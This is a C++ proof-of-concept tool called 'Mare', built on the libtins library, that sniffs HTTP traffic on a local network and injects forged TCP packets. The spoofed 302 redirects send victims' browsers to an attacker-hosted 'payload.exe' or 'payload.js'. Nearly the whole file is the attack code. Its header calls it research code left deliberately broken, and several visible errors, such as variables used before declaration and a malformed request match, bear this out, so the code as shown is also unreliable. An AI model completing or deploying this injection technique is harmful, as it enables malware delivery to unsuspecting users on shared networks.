// This code is meant to be used for legit security research
// it would take some time from the broken state of the code
// to use it for evil. This is by design.
// Peace, Love, and Happiness

#define TINS_STATIC 0 // Dont think about it

#include "stdafx.h"

using namespace Tins;

// Prototypes
using std::cout;
using std::endl;
using std::string;
using std::runtime_error;
using std::exception;

using namespace Tins;

PacketSender sender;
NetworkInterface selectedInterface;

// use 302 redirects to insert content into browsers using the same network medium
bool quantumInject(EthernetII::address_type srcLayer2, EthernetII::address_type dstLayer2,
    IP::address_type srcLayer3, IP::address_type dstLayer3, int srcPort, int dstPort, int tcpSEQ, int tcpACK, string payload) {

	// Build response payload
	EthernetII responseLayer2 = EthernetII();
	try {
		responseLayer2.src_addr(dstLayer2);
		responseLayer2.dst_addr(srcLayer2);
	}
	catch (exception e) {
		printf("-> Fail build Ethernet header: %s\n", e.what());
		return true;
	}

	// Build an IP header
	IP responseLayer3 = IP();
	try {
		responseLayer3.src_addr(dstLayer3);
		responseLayer3.dst_addr(srcLayer3);
	}
	catch (exception e) {
		printf("-> error building IP header -> %s\n", e.what());
		return true;
	}

	// Build a TCP header
	TCP responseLayer4 = TCP();
	try {
		responseLayer4.sport(dstPort);
		responseLayer4.dport(srcPort);
		responseLayer4.ack_seq(tcpSEQ + 1);
		responseLayer4.seq(tcpACK);
		responseLayer4.set_flag(TCP::Flags::PSH, 1);
		responseLayer4.set_flag(TCP::Flags::ACK, 1);
	}
	catch (exception e) {
		printf("-> Fail build TCP response header -> %s\n", e.what());
		return true;
	}

	RawPDU responsePayload(payload);

	// Configure sender object
	try {
		sender.default_interface(selectedInterface);
	}
	catch (exception e) {
		printf("-> Sender could not bind to the interface: %s\n", e.what());
		return true;
	}

	// Send the packet
	try {
		auto responsePacket = responseLayer2 / responseLayer3 / responseLayer4 / responsePayload;
		sender.send(responsePacket);
		printf("-> Sent redirect to: %s via %s\n", srcLayer3, srcLayer2);
	}
	catch (exception e) {
		printf("-> Fail sending response: %s\n", e.what());
		return true;
	}
}

// Handle PDUs
bool callback(PDU &pdu) {

	// Grab each layer in order to build the most correct response
	try {

		// Filter out other ports
		TCP &tcp = pdu.rfind_pdu<TCP>();
		if (tcp.dport != 80) { return true; }

		// Filter out incompatable requests
		RawPDU &raw = pdu.rfind_pdu<RawPDU>();
		const RawPDU::payload_type &payload = raw.payload();
		std::string message(payload.begin(), payload.end());
		if (message.find("HTTP 1.1/GET") != std::string::npos) {
			exeFlag = true;
		}
		
		EthernetII &eth = pdu.rfind_pdu<EthernetII>();
		IP &ip = pdu.rfind_pdu<IP>();

		try {
			const RawPDU::payload_type &payload = raw.payload();
			std::string message(payload.begin(), payload.end());

			bool exeFlag = false;
			bool jpgFlag = false;

			// Replace exe downloads
			//if (message.find("specific.jpg") != std::string::npos) {
			//	jpgFlag = true;
			//}

			// if injectable type
			if (exeFlag || jpgFlag) {

				// Avoid sending to the web servers themselves
				if (!ip.src_addr().is_private()) {
					return true;
				}

				printf("-> Calculate quantum payload for %s\n", ip.src_addr().to_string().c_str());

				// IP and TCP printout
				try {
					std::cout << "-> IP_SRC: " << ip.src_addr() << ", TCP_SRC_PORT: " << tcp.sport() << ", IP_DST: " << ip.dst_addr() << ", TCP_DST_PORT: " << tcp.dport() << ", TCP_ACK: " << tcp.ack_seq() << ", TCP_SEQ: " << tcp.seq() << std::endl;
					printf("-> Sending to %s\n", ip.src_addr().to_string().c_str());
				}
				catch (exception e) {
					printf("-> Error making an IP packet: %s\n", e.what());
				}

				// Build response payload
				EthernetII responseLayer2 = EthernetII();
				try {
					responseLayer2.src_addr(eth.dst_addr());
					responseLayer2.dst_addr(eth.src_addr());
				}
				catch (exception e) {
					printf("-> Error crafting Ethernet header: %s\n", e.what());
					return true;
				}

				// Build an IP header
				IP responseLayer3 = IP();
				try {
					responseLayer3.src_addr(ip.dst_addr());
					responseLayer3.dst_addr(ip.src_addr());
				}
				catch (exception e) {
					printf("-> Error crafting IP header -> %s\n", e.what());
					return true;
				}

				// Build a TCP header
				TCP responseLayer4 = TCP();
				try {
					responseLayer4.sport(tcp.dport());
					responseLayer4.dport(tcp.sport());
					responseLayer4.ack_seq(int(tcp.seq()) + 1);
					responseLayer4.seq(tcp.ack_seq());
					responseLayer4.set_flag(TCP::Flags::PSH, 1);
					responseLayer4.set_flag(TCP::Flags::ACK, 1);
				}
				catch (exception e) {
					printf("-> Error building TCP response header -> %s\n", e.what());
					return true;
				}

				// Tip with a quantum payload
				std::stringstream ss;
				ss << "HTTP/1.1 302 Found\r\n";
				// EXE Flag
				if (exeFlag) {
					ss << "Location: http://" << selectedInterface.ipv4_address().to_string().c_str() << "/payload.exe\r\n";
				// JPG Flag
				} else {
					ss << "Location: http://" << selectedInterface.ipv4_address().to_string().c_str() << "/payload.js\r\n";
				}
				ss << "Content-Length: 0\r\n\r\n";
				RawPDU responsePayload = ss.str();

				// Configure sender object
				try {
					sender.default_interface(selectedInterface);
				}
				catch (exception e) {
					printf("-> Sender could not bind to the interface: %s\n", e.what());
					return true;
				}

				// Send the packet
				try {
					auto responsePacket = responseLayer2 / responseLayer3 / responseLayer4 / responsePayload;
					responseLayer4.ack_seq(int(tcp.seq()));
					sender.send(responsePacket);
					responseLayer4.ack_seq(int(tcp.seq()) + 2);
					sender.send(responsePacket);
					responseLayer4.ack_seq(int(tcp.seq()) + 1);
					sender.send(responsePacket);
					responseLayer4.ack_seq(int(tcp.seq()) - 1);
					sender.send(responsePacket);
					responseLayer4.ack_seq(int(tcp.seq()) - 2);
					sender.send(responsePacket);
					responseLayer4.ack_seq(int(tcp.seq()) - 3);
					sender.send(responsePacket);
				}
				catch (exception e) {
					printf("-> Error sending response: %s\n", e.what());
					return true;
				}
			}
		} catch (exception e) {
			return true;
		}

	} catch (exception e) {
		printf("-> error find pdu : %s\n", e.what());
		return false;
	}
	return true;
}

//Entry point
int main(int argc, const char* argv[]) {

	// Launch the sniffer
	try {
		printf("\n\nMare\n");
		printf("---------\n");
		printf("-> Finding a network interface\n");
		auto devices = NetworkInterface::all();
		for (auto iface : devices) {
			try {
				// Sniff on the first working adaptor (this is a POC)
				if (iface.name().size() > 0 && iface.is_up() && iface.ipv4_address().is_private()) {
					string hwaddr = iface.hw_address().to_string();
					printf("-> listen on device with hwaddr: %s\n", hwaddr.c_str());
					SnifferConfiguration config = SnifferConfiguration();
					config.set_promisc_mode(Sniffer::PROMISC);
					config.set_filter("port 80 and tcp[tcpflags] & (tcp-push | tcp-ack) != 0");
					selectedInterface = iface;
					while (true) {
						Sniffer(iface.name().c_str(), config).sniff_loop(callback);
					}
				}
			} catch (exception e) {
				printf("-> Sniffer broke : %s\n", e.what());
				continue;
			}
		}
	// Catch exceptions when they go wrong
	} catch (exception e) {
		printf("-> main : %s", e.what());
	}
}
// end simple poc
// gnyxgbzr
